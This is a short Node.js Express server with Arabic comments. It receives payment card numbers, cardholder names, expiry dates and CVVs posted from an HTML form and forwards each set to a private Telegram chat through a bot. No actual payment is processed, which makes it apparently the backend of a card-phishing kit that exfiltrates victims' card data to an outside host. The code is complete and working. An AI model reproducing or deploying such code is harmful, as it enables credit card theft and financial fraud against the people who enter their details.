const express = require("express");
const cors = require("cors");
const axios = require("axios");
require("dotenv").config();

const app = express();
app.use(express.json());
app.use(cors());

// بيانات البوت من متغيرات البيئة
const BOT_TOKEN = process.env.BOT_TOKEN;
const CHAT_ID = process.env.CHAT_ID;

// استقبال البيانات من HTML وإرسالها إلى تيليجرام
app.post("/send", async (req, res) => {
    const { cardNumber, cardHolder, expiryDate, cvv, saveCard } = req.body;

    // التحقق من أن جميع الحقول ليست فارغة بعد إزالة المسافات الزائدة
    if (
        !cardNumber?.trim() || 
        !cardHolder?.trim() || 
        !expiryDate?.trim() || 
        !cvv?.trim()
    ) {
        return res.status(400).json({ message: "يجب ملء جميع الحقول!" });
    }

    const text = `🚀 بيانات جديدة:\n\n💳 رقم البطاقة: ${cardNumber}\n👤 اسم حامل البطاقة: ${cardHolder}\n📆 تاريخ الانتهاء: ${expiryDate}\n🔒 CVV: ${cvv}\n💾 حفظ البطاقة: ${saveCard ? "نعم" : "لا"}`;

    try {
        await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            chat_id: CHAT_ID,
            text: text
        });

        res.json({ message: "تم الإرسال بنجاح!" });
    } catch (error) {
        console.error("Error sending message:", error.response?.data || error.message);
        res.status(500).json({ message: "حدث خطأ أثناء الإرسال!" });
    }
});

// تشغيل السيرفر
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`🚀 Server running on port ${PORT}`));
